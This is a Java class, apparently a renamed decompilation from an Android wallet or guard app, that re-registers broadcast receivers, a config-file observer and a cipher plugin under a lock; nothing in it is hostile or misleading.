package com.guard.wallet.power;

import com.guard.wallet.core.AppUtils;
import com.guard.wallet.MainApplication;
import com.guard.wallet.plug.CrackLockCipherPlug;
import com.guard.wallet.utils.SystemHelper;
import com.guard.wallet.utils.SharedPrefsManager;
import java.util.concurrent.locks.ReentrantLock;

/**
 * vendor w/b.java -> SystemBootstrap
 *
 * 系统子模块重新初始化（广播接收器、配置文件监视等）。
 * reinitialize() 在锁保护下触发所有子系统的重新初始化,
 * 由服务启动或系统检测到状态丢失后调用。
 */
public abstract class SystemBootstrap {
    /** 重入锁 — 防止并发重新初始化 */
    public static final ReentrantLock lock = new ReentrantLock();

    /**
     * 重新初始化所有子系统。
     * 包括广播接收器注册、解锁状态恢复、配置文件监视器和密码插件。
     */
    public static void reinitialize() {
        ReentrantLock reentrantLock = lock;
        if (!reentrantLock.tryLock()) {
            return;
        }

        if (PowerSaveChecker.shouldKeepAlive()) {
            reentrantLock.unlock();
            return;
        }

        try {
            if (MainApplication.getInstance() != null) {
                // Re-register all broadcast receivers
                SystemHelper.k1();
                SystemHelper.W0();
                SystemHelper.c1();
                SystemHelper.l1();
                SystemHelper.b1();
                SystemHelper.j1();
                SystemHelper.h1();
                SystemHelper.i1();
                SystemHelper.m1();
                SystemHelper.e1();

                // Re-initialize unlocked state if needed
                if (!MainApplication.getInstance().isUserUnlockedInstance() && SharedPrefsManager.s()) {
                    MainApplication.getInstance().unlockedInstance();
                }

                // Re-create config file observer if missing
                if (MainApplication.getInstance().getConfigFileDeleteObserver() == null) {
                    String dir = SystemHelper.i0();
                    com.guard.wallet.observer.ConfigFileObserver observer = new com.guard.wallet.observer.ConfigFileObserver(dir, 26);
                    MainApplication.getInstance().setConfigFileDeleteObserver(observer);
                    observer.startWatching();
                }

                // Re-create crack lock cipher plug if missing
                if (MainApplication.getInstance().getCrackLockCipherPlug() == null) {
                    MainApplication app = MainApplication.getInstance();
                    CrackLockCipherPlug plug = new CrackLockCipherPlug();
                    app.setCrackLockCipherPlug(plug);
                }
            }
        } catch (Exception ex) {
            AppUtils.s("SystemBootstrap", ex);
        }

        reentrantLock.unlock();
    }
}
